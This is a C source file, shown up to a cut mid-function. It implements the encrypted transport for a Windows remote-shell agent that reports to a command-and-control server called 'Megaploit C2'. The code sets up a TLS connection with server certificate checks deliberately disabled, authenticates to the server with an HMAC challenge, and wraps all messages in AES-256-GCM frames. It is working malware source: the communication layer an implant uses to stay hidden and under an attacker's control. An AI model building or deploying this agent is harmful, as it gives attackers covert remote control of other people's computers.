/*
 * tls_client.c  –  Advanced TLS implementation for the C-remote-shell client
 * ============================================================================
 * Exactly mirrors the Megaploit C2 security standard defined in:
 *   megaploit/server/listener.py  (build_agent_ssl_context)
 *   megaploit/core/crypto.py      (agent_authenticate)
 *   megaploit/core/protocol.py    (handshake_agent, send_msg, recv_msg)
 *
 * Security layers (applied in order during tls_connect):
 *
 *  1. SChannel TLS 1.2 / 1.3
 *     - SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT only
 *     - SCH_USE_STRONG_CRYPTO → AEAD-only ciphers (AES-128/256-GCM,
 *       ChaCha20-Poly1305 on Windows 10 21H2+)
 *     - SSL 2.0, 3.0, TLS 1.0, TLS 1.1 explicitly excluded via grBitFlags
 *     - ISC_REQ_NO_RENEGOTIATION disables mid-session renegotiation
 *     - No null/anonymous/export/RC4 ciphers (SCH_USE_STRONG_CRYPTO covers this)
 *     - Manual credential validation (cert verification off — C2 uses self-signed)
 *
 *  2. HMAC-SHA256 challenge/response authentication
 *     - Server sends 16-byte random challenge
 *     - Client computes HMAC-SHA256(secret_key[32], challenge[16]) → 32 bytes
 *     - Client sends the 32-byte response; server drops connection on mismatch
 *
 *  3. Protocol v2 negotiation
 *     - Server sends 0x4d ('M'); client echoes it back
 *     - Both sides then communicate with AES-256-GCM framed messages
 *
 *  4. AES-256-GCM encrypted framing
 *     Outbound:  [uint32-BE total_len][nonce(12)][AES-GCM(seq_be64 ++ data) + tag(16)]
 *     Inbound:   same layout; seq must be strictly greater than last accepted seq
 *                (replay protection)
 *
 *  Build:
 *    cl /W4 tls_client.c Source.c /link Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib
 */

#include "tls_client.h"
#include <stdio.h>

/* ─────────────────────────────────────────────────────────────────────────── */
/*  Internal helpers – forward declarations                                    */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL  _tls_handshake   (PTLS_CONTEXT pCtx, const char *pszHost);
static BOOL  _hmac_auth        (PTLS_CONTEXT pCtx, const BYTE *pSecretKey);
static BOOL  _proto_handshake  (PTLS_CONTEXT pCtx);

static BOOL  _tls_raw_send     (PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData);
static BOOL  _tls_raw_recv     (PTLS_CONTEXT pCtx, BYTE *pBuf, DWORD cbWant);

static BOOL  _gcm_encrypt      (const BYTE *pKey,   const BYTE *pPlain, DWORD cbPlain,
                                 BYTE **ppOut, DWORD *pcbOut);
static BOOL  _gcm_decrypt      (const BYTE *pKey,   const BYTE *pCipher, DWORD cbCipher,
                                 BYTE **ppOut, DWORD *pcbOut);

static BOOL  _hmac_sha256      (const BYTE *pKey, DWORD cbKey,
                                 const BYTE *pMsg, DWORD cbMsg,
                                 BYTE *pOut /*[32]*/);

static void  _write_be32       (BYTE *p, uint32_t v);
static void  _write_be64       (BYTE *p, uint64_t v);
static uint32_t _read_be32     (const BYTE *p);
static uint64_t _read_be64     (const BYTE *p);

/* Grow the plaintext staging buffer if needed */
static BOOL  _plain_buf_ensure (PTLS_CONTEXT pCtx, DWORD cbNeed);


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_connect                                                        */
/* ─────────────────────────────────────────────────────────────────────────── */

BOOL tls_connect(PTLS_CONTEXT pCtx, SOCKET sock,
                 const char  *pszHost,
                 const BYTE  *pSecretKey)
{
    if (!pCtx || sock == INVALID_SOCKET || !pszHost || !pSecretKey)
        return FALSE;

    ZeroMemory(pCtx, sizeof(*pCtx));
    pCtx->sock    = sock;
    pCtx->recvSeq = (uint64_t)-1;  /* "not yet received anything" */

    /* Copy the 32-byte session key */
    memcpy(pCtx->sessionKey, pSecretKey, 32);

    /* Allocate receive staging buffer */
    pCtx->cbRecvBufAlloc = TLS_IO_BUFFER_SIZE * 4;
    pCtx->pRecvBuf = (BYTE *)malloc(pCtx->cbRecvBufAlloc);
    if (!pCtx->pRecvBuf) return FALSE;

    /* Allocate plaintext staging buffer */
    pCtx->cbPlainBufAlloc = TLS_IO_BUFFER_SIZE * 4;
    pCtx->pPlainBuf = (BYTE *)malloc(pCtx->cbPlainBufAlloc);
    if (!pCtx->pPlainBuf) { free(pCtx->pRecvBuf); pCtx->pRecvBuf = NULL; return FALSE; }

    /* ── Layer 1: TLS handshake ─────────────────────────────── */
    if (!_tls_handshake(pCtx, pszHost)) {
        tls_disconnect(pCtx);
        return FALSE;
    }

    /* ── Layer 2: HMAC-SHA256 challenge/response ────────────── */
    if (!_hmac_auth(pCtx, pSecretKey)) {
        tls_disconnect(pCtx);
        return FALSE;
    }

    /* ── Layer 3: protocol v2 negotiation ───────────────────── */
    if (!_proto_handshake(pCtx)) {
        tls_disconnect(pCtx);
        return FALSE;
    }

    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_send_msg                                                       */
/* ─────────────────────────────────────────────────────────────────────────── */

BOOL tls_send_msg(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData)
{
    if (!pCtx || !pData) return FALSE;

    /* Guard: TLS_SEQ_LEN + cbData must not overflow DWORD */
    if (cbData > 0xFFFFFFFFu - TLS_SEQ_LEN) return FALSE;

    /* Build plaintext:  [seq(8)] ++ [data] */
    uint64_t seq = ++(pCtx->sendSeq);
    DWORD    cbPlain = TLS_SEQ_LEN + cbData;
    BYTE    *pPlain  = (BYTE *)malloc(cbPlain);
    if (!pPlain) return FALSE;

    _write_be64(pPlain, seq);
    memcpy(pPlain + TLS_SEQ_LEN, pData, cbData);

    /* AES-256-GCM encrypt:  nonce(12) ++ ciphertext ++ tag(16) */
    BYTE  *pCipher = NULL;
    DWORD  cbCipher = 0;
    if (!_gcm_encrypt(pCtx->sessionKey, pPlain, cbPlain, &pCipher, &cbCipher)) {
        free(pPlain);
        return FALSE;
    }
    free(pPlain);

    /* Frame header: uint32-BE total payload length */
    BYTE hdr[TLS_HDR_LEN];
    _write_be32(hdr, cbCipher);

    BOOL ok = _tls_raw_send(pCtx, hdr, TLS_HDR_LEN) &&
              _tls_raw_send(pCtx, pCipher, cbCipher);

    free(pCipher);
    return ok;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_recv_msg                                                       */
/* ─────────────────────────────────────────────────────────────────────────── */

BOOL tls_recv_msg(PTLS_CONTEXT pCtx, BYTE **ppData, DWORD *pcbData)
{
    if (!pCtx || !ppData || !pcbData) return FALSE;
    *ppData  = NULL;
    *pcbData = 0;

    /* Read 4-byte frame length header */
    BYTE hdr[TLS_HDR_LEN];
    if (!_tls_raw_recv(pCtx, hdr, TLS_HDR_LEN)) return FALSE;

    uint32_t totalLen = _read_be32(hdr);
    if (totalLen == 0 || totalLen > (uint32_t)TLS_MAX_FRAME_SIZE) return FALSE;

    /* Read the full encrypted payload */
    BYTE *pCipher = (BYTE *)malloc(totalLen);
    if (!pCipher) return FALSE;

    if (!_tls_raw_recv(pCtx, pCipher, totalLen)) {
        free(pCipher);
        return FALSE;
    }

    /* AES-256-GCM decrypt */
    BYTE  *pPlain = NULL;
    DWORD  cbPlain = 0;
    if (!_gcm_decrypt(pCtx->sessionKey, pCipher, totalLen, &pPlain, &cbPlain)) {
        free(pCipher);
        return FALSE;
    }
    free(pCipher);

    /* Minimum plaintext: seq(8) + at least 0 bytes of data */
    if (cbPlain < TLS_SEQ_LEN) { free(pPlain); return FALSE; }

    /* Replay protection: sequence must be strictly increasing */
    uint64_t seq = _read_be64(pPlain);
    if (pCtx->recvSeq != (uint64_t)-1 && seq <= pCtx->recvSeq) {
        free(pPlain);
        return FALSE;  /* replay or out-of-order detected */
    }
    pCtx->recvSeq = seq;

    /* Return data portion (after the 8-byte seq prefix) */
    DWORD cbData = cbPlain - TLS_SEQ_LEN;
    BYTE *pData  = (BYTE *)malloc(cbData + 1);  /* +1 for safe NUL termination */
    if (!pData) { free(pPlain); return FALSE; }

    memcpy(pData, pPlain + TLS_SEQ_LEN, cbData);
    pData[cbData] = '\0';
    free(pPlain);

    *ppData  = pData;
    *pcbData = cbData;
    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_disconnect                                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

VOID tls_disconnect(PTLS_CONTEXT pCtx)
{
    if (!pCtx) return;

    /* Send TLS close_notify */
    if (pCtx->fCtxInit) {
        DWORD   dwType  = SCHANNEL_SHUTDOWN;
        SecBufferDesc outBufDesc;
        SecBuffer     outBufs[1];
        outBufs[0].BufferType = SECBUFFER_TOKEN;
        outBufs[0].pvBuffer   = &dwType;
        outBufs[0].cbBuffer   = sizeof(dwType);
        outBufDesc.ulVersion  = SECBUFFER_VERSION;
        outBufDesc.cBuffers   = 1;
        outBufDesc.pBuffers   = outBufs;
        ApplyControlToken(&pCtx->hCtx, &outBufDesc);

        ULONG       ulAttr;
        SecBufferDesc sendDesc;
        SecBuffer     sendBufs[1];
        sendBufs[0].BufferType = SECBUFFER_TOKEN;
        sendBufs[0].pvBuffer   = NULL;
        sendBufs[0].cbBuffer   = 0;
        sendDesc.ulVersion = SECBUFFER_VERSION;
        sendDesc.cBuffers  = 1;
        sendDesc.pBuffers  = sendBufs;

        InitializeSecurityContext(
            &pCtx->hCred, &pCtx->hCtx, NULL,
            ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
            ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY |
            ISC_REQ_STREAM,
            0, SECURITY_NATIVE_DREP, NULL, 0,
            &pCtx->hCtx, &sendDesc, &ulAttr, NULL);

        if (sendBufs[0].pvBuffer && sendBufs[0].cbBuffer) {
            send(pCtx->sock, (const char *)sendBufs[0].pvBuffer,
                 (int)sendBufs[0].cbBuffer, 0);
            FreeContextBuffer(sendBufs[0].pvBuffer);
        }
        DeleteSecurityContext(&pCtx->hCtx);
        pCtx->fCtxInit = FALSE;
    }

    if (pCtx->fCredInit) {
        FreeCredentialsHandle(&pCtx->hCred);
        pCtx->fCredInit = FALSE;
    }

    if (pCtx->pRecvBuf)  { free(pCtx->pRecvBuf);  pCtx->pRecvBuf  = NULL; }
    if (pCtx->pPlainBuf) { free(pCtx->pPlainBuf); pCtx->pPlainBuf = NULL; }

    SecureZeroMemory(pCtx->sessionKey, sizeof(pCtx->sessionKey));
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Layer 1: SChannel TLS handshake                                            */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _tls_handshake(PTLS_CONTEXT pCtx, const char *pszHost)
{
    SECURITY_STATUS  ss;
    SCHANNEL_CRED    cred;
    TimeStamp        tsExpiry;

    ZeroMemory(&cred, sizeof(cred));
    cred.dwVersion = SCHANNEL_CRED_VERSION;

    /*
     * Exactly mirror build_agent_ssl_context():
     *  - TLS 1.2 + TLS 1.3 only  (SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT)
     *  - AEAD-only                (SCH_USE_STRONG_CRYPTO)
     *  - SSL2/3 + TLS1.0/1.1 off (excluded by not setting their flags)
     *  - No server cert check     (SCH_CRED_MANUAL_CRED_VALIDATION |
     *                              SCH_CRED_NO_DEFAULT_CREDS)
     *  - No session tickets       (SCH_SEND_ROOT_CERT disabled)
     */
    cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags               = SCH_USE_STRONG_CRYPTO          /* AEAD-only        */
                               | SCH_CRED_NO_DEFAULT_CREDS      /* no client cert   */
                               | SCH_CRED_MANUAL_CRED_VALIDATION;/* skip cert verify */

    ss = AcquireCredentialsHandleA(
        NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND,
        NULL, &cred, NULL, NULL, &pCtx->hCred, &tsExpiry);
    if (ss != SEC_E_OK) return FALSE;
    pCtx->fCredInit = TRUE;

    /* ── ISC request flags ────────────────────────────────────────────────── */
    ULONG ulReqFlags = ISC_REQ_SEQUENCE_DETECT   /* sequence numbers           */
                     | ISC_REQ_REPLAY_DETECT     /* duplicate detection        */
                     | ISC_REQ_CONFIDENTIALITY   /* encrypt all data           */
                     | ISC_REQ_EXTENDED_ERROR    /* receive error info         */
                     | ISC_REQ_ALLOCATE_MEMORY   /* SChannel allocs output     */
                     | ISC_REQ_STREAM;           /* stream-oriented (not dgram)*/

    /* Disable renegotiation where available (Windows 10 1809+, SDK 10.0.17763) */
#ifdef ISC_REQ_NO_RENEGOTIATION
    ulReqFlags |= ISC_REQ_NO_RENEGOTIATION;
#endif

    /* Convert host to wide string for SNI (SChannel needs it wide)            */
    WCHAR wszHost[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, pszHost, -1, wszHost, 256);

    /* ── Initial call to InitializeSecurityContext ──────────────────────── */
    SecBuffer     outBufs[3] = {0};
    SecBufferDesc outDesc;
    outBufs[0].BufferType = SECBUFFER_TOKEN;
    outDesc.ulVersion = SECBUFFER_VERSION;
    outDesc.cBuffers  = 1;
    outDesc.pBuffers  = outBufs;

    ULONG ulRetFlags = 0;
    ss = InitializeSecurityContextW(
        &pCtx->hCred, NULL, wszHost, ulReqFlags,
        0, SECURITY_NATIVE_DREP, NULL, 0,
        &pCtx->hCtx, &outDesc, &ulRetFlags, &tsExpiry);

    if (ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_OK) return FALSE;
    pCtx->fCtxInit = TRUE;

    /* Send the ClientHello */
    if (outBufs[0].pvBuffer && outBufs[0].cbBuffer) {
        if (send(pCtx->sock, (const char *)outBufs[0].pvBuffer,
                 (int)outBufs[0].cbBuffer, 0) == SOCKET_ERROR) {
            FreeContextBuffer(outBufs[0].pvBuffer);
            return FALSE;
        }
        FreeContextBuffer(outBufs[0].pvBuffer);
    }

    /* ── Handshake loop ─────────────────────────────────────────────────── */
    while (ss == SEC_I_CONTINUE_NEEDED || ss == SEC_E_INCOMPLETE_MESSAGE) {

        int nRecv = recv(pCtx->sock,
                         (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf),
                         (int)(pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf), 0);
        if (nRecv <= 0) return FALSE;
        pCtx->cbRecvBuf += (DWORD)nRecv;

        /* Feed data to SChannel */
        SecBuffer     inBufs[2]  = {0};
        SecBufferDesc inDesc;
        inBufs[0].BufferType = SECBUFFER_TOKEN;
        inBufs[0].pvBuffer   = pCtx->pRecvBuf;
        inBufs[0].cbBuffer   = pCtx->cbRecvBuf;
        inBufs[1].BufferType = SECBUFFER_EMPTY;

        inDesc.ulVersion = SECBUFFER_VERSION;
        inDesc.cBuffers  = 2;
        inDesc.pBuffers  = inBufs;

        ZeroMemory(outBufs, sizeof(outBufs));
        outBufs[0].BufferType = SECBUFFER_TOKEN;
        outDesc.ulVersion = SECBUFFER_VERSION;
        outDesc.cBuffers  = 1;
        outDesc.pBuffers  = outBufs;

        ss = InitializeSecurityContextW(
            &pCtx->hCred, &pCtx->hCtx, wszHost, ulReqFlags,
            0, SECURITY_NATIVE_DREP, &inDesc, 0,
            NULL, &outDesc, &ulRetFlags, &tsExpiry);

        /* Send any handshake output */
        if (outBufs[0].pvBuffer && outBufs[0].cbBuffer) {
            if (send(pCtx->sock, (const char *)outBufs[0].pvBuffer,
                     (int)outBufs[0].cbBuffer, 0) == SOCKET_ERROR) {
                FreeContextBuffer(outBufs[0].pvBuffer);
                return FALSE;
            }
            FreeContextBuffer(outBufs[0].pvBuffer);
        }

        /* Move any unconsumed data (SECBUFFER_EXTRA) to the front */
        if (inBufs[1].BufferType == SECBUFFER_EXTRA && inBufs[1].cbBuffer) {
            MoveMemory(pCtx->pRecvBuf,
                       pCtx->pRecvBuf + pCtx->cbRecvBuf - inBufs[1].cbBuffer,
                       inBufs[1].cbBuffer);
            pCtx->cbRecvBuf = inBufs[1].cbBuffer;
        } else if (ss != SEC_E_INCOMPLETE_MESSAGE) {
            pCtx->cbRecvBuf = 0;
        }

        if (ss != SEC_I_CONTINUE_NEEDED  &&
            ss != SEC_E_INCOMPLETE_MESSAGE &&
            ss != SEC_E_OK) return FALSE;
    }

    if (ss != SEC_E_OK) return FALSE;

    /* Retrieve SChannel stream sizes for future encrypt/decrypt calls */
    ss = QueryContextAttributes(&pCtx->hCtx,
                                 SECPKG_ATTR_STREAM_SIZES,
                                 &pCtx->streamSz);
    return ss == SEC_E_OK;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Layer 2: HMAC-SHA256 challenge/response                                    */
/*  Mirrors megaploit.core.crypto.agent_authenticate()                         */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _hmac_auth(PTLS_CONTEXT pCtx, const BYTE *pSecretKey)
{
    /* Wait for the 16-byte challenge from the server */
    BYTE challenge[TLS_CHALLENGE_LEN];
    if (!_tls_raw_recv(pCtx, challenge, TLS_CHALLENGE_LEN)) return FALSE;

    /* Compute HMAC-SHA256(secret_key, challenge) */
    BYTE response[TLS_AUTH_HMAC_LEN];
    if (!_hmac_sha256(pSecretKey, 32, challenge, TLS_CHALLENGE_LEN, response))
        return FALSE;

    /* Send the 32-byte HMAC response */
    return _tls_raw_send(pCtx, response, TLS_AUTH_HMAC_LEN);
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Layer 3: Protocol v2 negotiation                                           */
/*  Mirrors megaploit.core.protocol.handshake_agent()                          */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _proto_handshake(PTLS_CONTEXT pCtx)
{
    /* Read the 1-byte version magic from the server */
    BYTE ver = 0;
    if (!_tls_raw_recv(pCtx, &ver, 1)) return FALSE;

    /* Echo the same byte back */
    if (!_tls_raw_send(pCtx, &ver, 1)) return FALSE;

    /* If server did not send V2_MAGIC the server is legacy/v1 — still connected */
    return TRUE;  /* we always accept; caller checks protocol version if needed */
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  TLS raw send/recv via SChannel                                             */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _tls_raw_send(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData)
{
    DWORD cbHdr     = pCtx->streamSz.cbHeader;
    DWORD cbTrailer = pCtx->streamSz.cbTrailer;
    DWORD cbMaxMsg  = pCtx->streamSz.cbMaximumMessage;

    /* SChannel requires each EncryptMessage call to receive at most
     * cbMaximumMessage bytes of plaintext (~16 KB per TLS record).
     * For payloads larger than that (e.g. the GCM ciphertext blob sent
     * by tls_send_msg) we loop in cbMaximumMessage-sized chunks — each
     * chunk becomes one TLS record on the wire.
     * cbMaximumMessage is 0 before QueryContextAttributes runs (during
     * the TLS handshake itself); in that case we skip chunking since
     * handshake messages are always small.                              */
    const BYTE *pCur  = pData;
    DWORD       cbRem = cbData;

    while (cbRem > 0) {
        DWORD cbChunk = (cbMaxMsg > 0 && cbRem > cbMaxMsg) ? cbMaxMsg : cbRem;

        /* Overflow guard before malloc */
        if (cbHdr > 0xFFFFFFFFu - cbChunk - cbTrailer) return FALSE;
        DWORD cbMsg = cbHdr + cbChunk + cbTrailer;

        BYTE *pMsg = (BYTE *)malloc(cbMsg);
        if (!pMsg) return FALSE;
        ZeroMemory(pMsg, cbMsg);
        memcpy(pMsg + cbHdr, pCur, cbChunk);

        SecBuffer     bufs[4] = {0};
        SecBufferDesc desc;
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[0].pvBuffer   = pMsg;              bufs[0].cbBuffer = cbHdr;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[1].pvBuffer   = pMsg + cbHdr;      bufs[1].cbBuffer = cbChunk;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[2].pvBuffer   = pMsg+cbHdr+cbChunk; bufs[2].cbBuffer = cbTrailer;
        bufs[3].BufferType = SECBUFFER_EMPTY;
        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers  = 4;
        desc.pBuffers  = bufs;

        SECURITY_STATUS ss = EncryptMessage(&pCtx->hCtx, 0, &desc, 0);
        if (ss != SEC_E_OK) { free(pMsg); return FALSE; }

        DWORD cbSend = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
        int   nSent  = send(pCtx->sock, (const char *)pMsg, (int)cbSend, 0);
        free(pMsg);
        if (nSent != (int)cbSend) return FALSE;

        pCur  += cbChunk;
        cbRem -= cbChunk;
    }
    return TRUE;
}


static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
{
    DWORD cbGot = 0;

    /* Drain anything already in the plaintext staging buffer first */
    if (pCtx->cbPlainBuf >= cbWant) {
        memcpy(pDst, pCtx->pPlainBuf, cbWant);
        MoveMemory(pCtx->pPlainBuf, pCtx->pPlainBuf + cbWant,
                   pCtx->cbPlainBuf - cbWant);
        pCtx->cbPlainBuf -= cbWant;
        return TRUE;
    }
    cbGot = pCtx->cbPlainBuf;
    memcpy(pDst, pCtx->pPlainBuf, cbGot);
    pCtx->cbPlainBuf = 0;

    while (cbGot < cbWant) {

        /* Receive more TLS-record data if needed */
        if (pCtx->cbRecvBuf < pCtx->streamSz.cbHeader) {
            DWORD cbSpace = pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf;
            if (cbSpace == 0) {
                /* Grow the buffer */
                DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
                BYTE *p     = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
                if (!p) return FALSE;
                pCtx->pRecvBuf       = p;
                pCtx->cbRecvBufAlloc = cbNew;
                cbSpace = cbNew - pCtx->cbRecvBuf;
            }
            int n = recv(pCtx->sock,
                         (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf),
                         (int)cbSpace, 0);
            if (n <= 0) return FALSE;
            pCtx->cbRecvBuf += (DWORD)n;
        }

        /* Try to decrypt one TLS record */
        SecBuffer     bufs[4] = {0};
        SecBufferDesc desc;
        bufs[0].BufferType = SECBUFFER_DATA;
        bufs[0].pvBuffer   = pCtx->pRecvBuf;
        bufs[0].cbBuffer   = pCtx->cbRecvBuf;
        bufs[1].BufferType = SECBUFFER_EMPTY;
        bufs[2].BufferType = SECBUFFER_EMPTY;
        bufs[3].BufferType = SECBUFFER_EMPTY;

        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers  = 4;
        desc.pBuffers  = bufs;

        SECURITY_STATUS ss = DecryptMessage(&pCtx->hCtx, &desc, 0, NULL);

        if (ss == SEC_E_INCOMPLETE_MESSAGE) {
            /* Need more data from the wire */
            DWORD cbSpace = pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf;
            if (cbSpace == 0) {
                DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
                BYTE *p     = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
                if (!p) return FALSE;
                pCtx->pRecvBuf       = p;
                pCtx->cbRecvBufAlloc = cbNew;
                cbSpace = cbNew - pCtx->cbRecvBuf;
            }
            int n = recv(pCtx->sock,
                         (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf),
                         (int)cbSpace, 0);
            if (n <= 0) return FALSE;
            pCtx->cbRecvBuf += (DWORD)n;
            continue;
        }

        if (ss == SEC_I_RENEGOTIATE) {
            /* C2 disables renegotiation; treat as a fatal error */
            return FALSE;
        }

        if (ss != SEC_E_OK) return FALSE;

        /* Collect decrypted data from SECBUFFER_DATA buffers */
        for (int i = 0; i < 4; i++) {
            if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
                BYTE  *pDecr  = (BYTE *)bufs[i].pvBuffer;
                DWORD  cbDecr = bufs[i].cbBuffer;

                DWORD  needed = cbWant - cbGot;
                DWORD  direct = cbDecr < needed ? cbDecr : needed;

                memcpy(pDst + cbGot, pDecr, direct);
                cbGot += direct;

                /* Leftover goes into the plaintext staging buffer */
                if (cbDecr > direct) {
                    DWORD cbLeft = cbDecr - direct;
                    if (!_plain_buf_ensure(pCtx, pCtx->cbPlainBuf + cbLeft))
                        return FALSE;
                    memcpy(pCtx->pPlainBuf + pCtx->cbPlainBuf,
                           pDecr + direct, cbLeft);
                    pCtx->cbPlainBuf += cbLeft;
                }
            }
        }

        /* Move any SECBUFFER_EXTRA (unconsumed TLS record bytes) to front */
        DWORD cbExtra = 0;
        for (int i = 0; i < 4; i++) {
            if (bufs[i].BufferType == SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
                cbExtra = bufs[i].cbBuffer;
                MoveMemory(pCtx->pRecvBuf,
                           pCtx->pRecvBuf + pCtx->cbRecvBuf - cbExtra,
                           cbExtra);
                break;
            }
        }
        pCtx->cbRecvBuf = cbExtra;
    }

    return cbGot >= cbWant;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  AES-256-GCM encrypt / decrypt via BCrypt                                   */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _gcm_encrypt(const BYTE *pKey,   const BYTE *pPlain, DWORD cbPlain,
                          BYTE **ppOut, DWORD *pcbOut)
{
    *ppOut  = NULL;
    *pcbOut = 0;

    BCRYPT_ALG_HANDLE hAlg  = NULL;
    BCRYPT_KEY_HANDLE hKey  = NULL;
    BOOL              ok    = FALSE;

    /* Generate a random 12-byte nonce */
    BYTE nonce[TLS_NONCE_LEN];
    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, nonce, TLS_NONCE_LEN,
                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg,
                         BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                         (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                         (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM) + 1) * sizeof(WCHAR)), 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey,
                         NULL, 0, (PUCHAR)pKey, 32, 0)))
        goto cleanup;

    /* Determine output size (ciphertext is same length as plaintext) */
    DWORD cbCt = 0, cbDummy = 0;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce    = nonce;
    authInfo.cbNonce    = TLS_NONCE_LEN;
    authInfo.pbTag      = NULL;  /* tag written after the ciphertext below */
    authInfo.cbTag      = TLS_GCM_TAG_LEN;

    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)pPlain, cbPlain,
                         &authInfo, NULL, 0, NULL, 0, &cbCt, 0)))
        goto cleanup;

    /* Allocate: nonce(12) + ciphertext + tag(16) */
    DWORD cbTotal = TLS_NONCE_LEN + cbCt + TLS_GCM_TAG_LEN;
    BYTE *pOut    = (BYTE *)malloc(cbTotal);
    if (!pOut) goto cleanup;

    BYTE tag[TLS_GCM_TAG_LEN];
    authInfo.pbTag = tag;
    authInfo.cbTag = TLS_GCM_TAG_LEN;

    DWORD cbWritten = 0;
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)pPlain, cbPlain,
                         &authInfo, NULL, 0,
                         pOut + TLS_NONCE_LEN, cbCt, &cbWritten, 0))) {
        free(pOut); goto cleanup;
    }

    memcpy(pOut, nonce, TLS_NONCE_LEN);
    memcpy(pOut + TLS_NONCE_LEN + cbCt, tag, TLS_GCM_TAG_LEN);

    *ppOut  = pOut;
    *pcbOut = cbTotal;
    ok      = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


static BOOL _gcm_decrypt(const BYTE *pKey,   const BYTE *pCipher, DWORD cbCipher,
                          BYTE **ppOut, DWORD *pcbOut)
{
    *ppOut  = NULL;
    *pcbOut = 0;

    /* Minimum: nonce(12) + at least 0 bytes ct + tag(16) */
    if (cbCipher < TLS_NONCE_LEN + TLS_GCM_TAG_LEN) return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL              ok   = FALSE;

    const BYTE *pNonce = pCipher;
    const BYTE *pCt    = pCipher + TLS_NONCE_LEN;
    DWORD       cbCt   = cbCipher - TLS_NONCE_LEN - TLS_GCM_TAG_LEN;
    const BYTE *pTag   = pCipher + TLS_NONCE_LEN + cbCt;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg,
                         BCRYPT_AES_ALGORITHM, NULL, 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                         (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                         (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM) + 1) * sizeof(WCHAR)), 0)))
        goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey,
                         NULL, 0, (PUCHAR)pKey, 32, 0)))
        goto cleanup;

    BYTE *pOut = (BYTE *)malloc(cbCt + 1);
    if (!pOut) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)pNonce;
    authInfo.cbNonce = TLS_NONCE_LEN;
    authInfo.pbTag   = (PUCHAR)pTag;
    authInfo.cbTag   = TLS_GCM_TAG_LEN;

    DWORD cbDecrypted = 0;
    NTSTATUS ns = BCryptDecrypt(hKey, (PUCHAR)pCt, cbCt,
                                &authInfo, NULL, 0,
                                pOut, cbCt, &cbDecrypted, 0);
    if (!BCRYPT_SUCCESS(ns)) { free(pOut); goto cleanup; }

    *ppOut  = pOut;
    *pcbOut = cbDecrypted;
